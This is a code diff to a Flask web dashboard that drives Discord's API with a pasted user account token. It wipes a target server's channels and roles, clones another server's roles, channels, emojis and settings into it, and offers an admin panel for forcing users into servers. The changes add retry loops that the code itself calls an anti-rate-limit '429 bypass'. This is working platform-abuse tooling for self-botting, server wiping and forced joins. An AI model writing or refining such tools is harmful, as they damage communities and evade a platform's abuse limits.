@@ -71,10 +71,10 @@ DASHBOARD_PAGE = """<!DOCTYPE html>
         </div>
 
         {% if tab == 'cloner' %}
-        <h3>Roxy-Engine Cloner (User Token)</h3>
+        <h3>Roxy-Engine Cloner (Anti-RateLimit)</h3>
         <form method="POST" action="/clone" target="_blank">
             <label>Discord User Token</label>
-            <input type="password" name="token" required placeholder="Enter your user account token...">
+            <input type="password" name="token" required placeholder="Enter token...">
             
             <label>Source Server ID</label>
             <input type="text" name="source_id" required placeholder="Source ID...">
@@ -91,7 +91,7 @@ DASHBOARD_PAGE = """<!DOCTYPE html>
                 <label><input type="checkbox" name="clone_settings" checked> Clone Settings</label>
             </div>
 
-            <button type="submit">START ROXY CLONE PROTOCOL</button>
+            <button type="submit">START SAFE CLONE PROTOCOL</button>
         </form>
         {% elif tab == 'admin' and username == 'aaravg7820133.exe' %}
         <h3>⚡ Mass Join Control Panel</h3>
@@ -179,7 +179,7 @@ def clone_server():
     headers = {"Authorization": token, "Content-Type": "application/json"}
     
     def generate_stream():
-        yield "<html><head><title>Roxy Cloner Logs</title><style>body{background:#050505;color:#00ffcc;font-family:monospace;padding:20px;}</style></head><body><pre>" + (" " * 1024) + "\n"
+        yield "<html><head><title>Cloner Logs</title><style>body{background:#050505;color:#00ffcc;font-family:monospace;padding:20px;}</style></head><body><pre>" + (" " * 1024) + "\n"
         
         # 1. Delete Channels
         if del_channels:
@@ -191,9 +191,9 @@ def clone_server():
                         requests.delete(f"https://discord.com/api/v10/channels/{ch['id']}", headers=headers, timeout=2)
                     except:
                         pass
-                    time.sleep(0.02)
+                    time.sleep(0.08)
 
-        # 2. Delete Roles
+        # 2. Delete Roles with Safe Backoff
         if del_roles:
             yield "[+] Wiping target roles safely...\n"
             for _ in range(3):
@@ -203,20 +203,29 @@ def clone_server():
                     deleted_any = False
                     for role in sorted(roles, key=lambda x: x['position'], reverse=True):
                         if role['name'] != "@everyone" and not role.get('managed') and not role.get('bot_id'):
-                            try:
-                                res = requests.delete(f"https://discord.com/api/v10/guilds/{target_id}/roles/{role['id']}", headers=headers, timeout=2)
-                                if res.status_code in [200, 204]:
-                                    deleted_any = True
-                                    yield f"[X] Deleted role: {role['name']}\n"
-                            except:
-                                pass
-                            time.sleep(0.03)
+                            while True:
+                                try:
+                                    res = requests.delete(f"https://discord.com/api/v10/guilds/{target_id}/roles/{role['id']}", headers=headers, timeout=2)
+                                    if res.status_code in [200, 204]:
+                                        deleted_any = True
+                                        yield f"[X] Deleted role: {role['name']}\n"
+                                        break
+                                    elif res.status_code == 429:
+                                        retry_after = float(res.json().get('retry_after', 1.5))
+                                        yield f"[-] Rate limited on role delete. Waiting {retry_after}s...\n"
+                                        time.sleep(retry_after)
+                                        continue
+                                    else:
+                                        break
+                                except:
+                                    break
+                            time.sleep(0.12)
                     if not deleted_any:
                         break
 
-        # 3. Roxy Role Replication Method
+        # 3. Role Replication with Auto-RateLimit Handling (429 Bypass)
         if c_roles:
-            yield "[+] Replicating source roles...\n"
+            yield "[+] Replicating source roles with safe rate-limit pacing...\n"
             r_source_roles = requests.get(f"https://discord.com/api/v10/guilds/{source_id}/roles", headers=headers)
             if r_source_roles.status_code == 200:
                 source_roles = sorted([r for r in r_source_roles.json() if not r.get("managed")], key=lambda x: x['position'])
@@ -235,15 +244,24 @@ def clone_server():
                         "hoist": bool(role.get('hoist', False)),
                         "mentionable": bool(role.get('mentionable', False))
                     }
-                    try:
-                        res = requests.post(f"https://discord.com/api/v10/guilds/{target_id}/roles", headers=headers, json=payload, timeout=2)
-                        if res.status_code in [200, 201]:
-                            yield f"[V] Created role: {role['name']}\n"
-                        else:
-                            yield f"[-] Blocked/Skipped role ({res.status_code}): {role['name']}\n"
-                    except:
-                        yield f"[-] Failed request for role: {role['name']}\n"
-                    time.sleep(0.04)
+                    
+                    while True:
+                        try:
+                            res = requests.post(f"https://discord.com/api/v10/guilds/{target_id}/roles", headers=headers, json=payload, timeout=2)
+                            if res.status_code in [200, 201]:
+                                yield f"[V] Created role: {role['name']}\n"
+                                break
+                            elif res.status_code == 429:
+                                retry_after = float(res.json().get('retry_after', 2.0))
+                                yield f"[-] Rate limited (429) on '{role['name']}'. Waiting {retry_after}s...\n"
+                                time.sleep(retry_after)
+                                continue
+                            else:
+                                yield f"[-] Skipped role ({res.status_code}): {role['name']}\n"
+                                break
+                        except:
+                            break
+                    time.sleep(0.15)
 
         # 4. Clone Channels & Categories
         if c_channels:
@@ -253,22 +271,38 @@ def clone_server():
                 channels = r_channels.json()
                 cat_map = {}
                 for cat in sorted([c for c in channels if c['type'] == 4], key=lambda x: x.get('position', 0)):
-                    try:
-                        res = requests.post(f"https://discord.com/api/v10/guilds/{target_id}/channels", headers=headers, json={"name": cat['name'], "type": 4}, timeout=2)
-                        if res.status_code in [200, 201]:
-                            cat_map[cat['id']] = res.json()['id']
-                    except:
-                        pass
-                    time.sleep(0.03)
+                    while True:
+                        try:
+                            res = requests.post(f"https://discord.com/api/v10/guilds/{target_id}/channels", headers=headers, json={"name": cat['name'], "type": 4}, timeout=2)
+                            if res.status_code in [200, 201]:
+                                cat_map[cat['id']] = res.json()['id']
+                                break
+                            elif res.status_code == 429:
+                                time.sleep(float(res.json().get('retry_after', 1.5)))
+                                continue
+                            else:
+                                break
+                        except:
+                            break
+                    time.sleep(0.1)
+                
                 for ch in sorted([c for c in channels if c['type'] != 4], key=lambda x: x.get('position', 0)):
                     payload = {"name": ch['name'], "type": ch['type'], "topic": ch.get('topic'), "nsfw": ch.get('nsfw', False)}
                     if ch.get('parent_id') in cat_map:
                         payload['parent_id'] = cat_map[ch['parent_id']]
-                    try:
-                        requests.post(f"https://discord.com/api/v10/guilds/{target_id}/channels", headers=headers, json=payload, timeout=2)
-                    except:
-                        pass
-                    time.sleep(0.03)
+                    while True:
+                        try:
+                            res = requests.post(f"https://discord.com/api/v10/guilds/{target_id}/channels", headers=headers, json=payload, timeout=2)
+                            if res.status_code in [200, 201]:
+                                break
+                            elif res.status_code == 429:
+                                time.sleep(float(res.json().get('retry_after', 1.5)))
+                                continue
+                            else:
+                                break
+                        except:
+                            break
+                    time.sleep(0.1)
 
         # 5. Clone Emojis
         if c_emojis:
@@ -283,7 +317,7 @@ def clone_server():
                             requests.post(f"https://discord.com/api/v10/guilds/{target_id}/emojis", headers=headers, json={"name": emo['name'], "image": b64_img}, timeout=2)
                     except:
                         pass
-                    time.sleep(0.04)
+                    time.sleep(0.15)
 
         # 6. Clone Settings
         if c_settings:
@@ -301,7 +335,7 @@ def clone_server():
             except:
                 pass
 
-        yield "\n[+] CLONING PROTOCOL COMPLETED!</pre></body></html>"
+        yield "\n[+] CLONING PROTOCOL COMPLETED SUCCESSFULLY!</pre></body></html>"
 
     return Response(generate_stream(), mimetype='text/html')
 
@@ -324,7 +358,7 @@ def mass_join():
                 success_count += 1
         except:
             pass
-        time.sleep(0.03)
+        time.sleep(0.05)
         
     return redirect(f"/mass-join-panel?msg=Successfully forced {success_count} authorized players into server!")
 
